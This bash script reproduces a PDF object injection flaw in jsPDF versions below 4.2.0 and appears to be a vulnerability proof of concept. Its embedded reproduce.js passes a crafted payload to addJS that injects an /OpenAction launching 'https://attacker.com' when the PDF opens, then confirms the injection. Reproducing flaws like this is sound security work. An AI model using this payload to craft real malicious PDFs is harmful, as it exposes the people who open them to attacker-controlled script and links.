#!/bin/bash
set -euo pipefail

# Portable root detection
ROOT="${PRUVA_ROOT:-$(cd "$(dirname "$0")/.." && pwd)}"
LOGS="$ROOT/logs"
mkdir -p "$LOGS"

cd "$ROOT"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo "========================================="
echo "jsPDF PDF Object Injection Reproduction"
echo "========================================="
echo ""

# Setup test directory
TEST_DIR="$ROOT/test_jspdf"
mkdir -p "$TEST_DIR"
cd "$TEST_DIR"

# Initialize Node.js project if not exists
if [ ! -f "package.json" ]; then
    echo "[*] Initializing Node.js project..."
    npm init -y > "$LOGS/npm_init.log" 2>&1
    # Enable ES modules (reproduce.js uses import syntax)
    node -e "var p=JSON.parse(require('fs').readFileSync('package.json','utf8'));p.type='module';require('fs').writeFileSync('package.json',JSON.stringify(p,null,2))"
fi

# Install vulnerable jsPDF version
echo "[*] Installing vulnerable jsPDF version (< 4.2.0)..."
npm install jspdf@4.1.0 --save > "$LOGS/npm_install.log" 2>&1

# Create the reproduction script
cat > reproduce.js << 'EOF'
import { jsPDF } from "jspdf";
import fs from "fs";

console.log("[*] Testing jsPDF PDF Object Injection");
console.log("[*] jsPDF version: < 4.2.0 (vulnerable)");

// Malicious payload that injects an OpenAction
// This will execute JavaScript immediately when the PDF opens
const maliciousPayload = ") >> /OpenAction << /S /JavaScript /JS (app.launchURL('https://attacker.com', true)) >>";

console.log("[*] Creating PDF with malicious payload...");
const doc = new jsPDF();
doc.text("Test Document", 10, 10);
doc.addJS(maliciousPayload);

// Save the PDF
const pdfOutput = doc.output();
fs.writeFileSync("vulnerable.pdf", pdfOutput, "binary");

console.log("[*] PDF saved as vulnerable.pdf");

// Check if the PDF contains the injected OpenAction
if (pdfOutput.includes("/OpenAction")) {
    console.log("[+] VULNERABILITY CONFIRMED: /OpenAction found in PDF output!");
    console.log("[+] The malicious payload successfully injected a PDF object.");
    
    // Extract and show the relevant part
    const openActionIndex = pdfOutput.indexOf("/OpenAction");
    const context = pdfOutput.substring(Math.max(0, openActionIndex - 50), openActionIndex + 200);
    console.log("\n[*] Context around injection:");
    console.log(context);
    
    process.exit(0);
} else {
    console.log("[-] Vulnerability not reproduced - /OpenAction not found");
    process.exit(1);
}
EOF

echo "[*] Running reproduction script..."
node reproduce.js > "$LOGS/reproduce.log" 2>&1
EXIT_CODE=$?

if [ $EXIT_CODE -eq 0 ]; then
    echo -e "${GREEN}[+] VULNERABILITY CONFIRMED!${NC}"
    echo "    The jsPDF addJS method allows PDF object injection."
    echo "    See logs at $LOGS/reproduce.log"
    
    # Show the relevant part of the PDF
    if [ -f "vulnerable.pdf" ]; then
        echo ""
        echo "[*] PDF structure analysis:"
        strings vulnerable.pdf | grep -A5 -B5 "OpenAction" | head -20 || true
    fi
    
    exit 0
else
    echo -e "${RED}[-] Reproduction failed${NC}"
    echo "    Check logs at $LOGS/reproduce.log"
    cat "$LOGS/reproduce.log" || true
    exit 1
fi
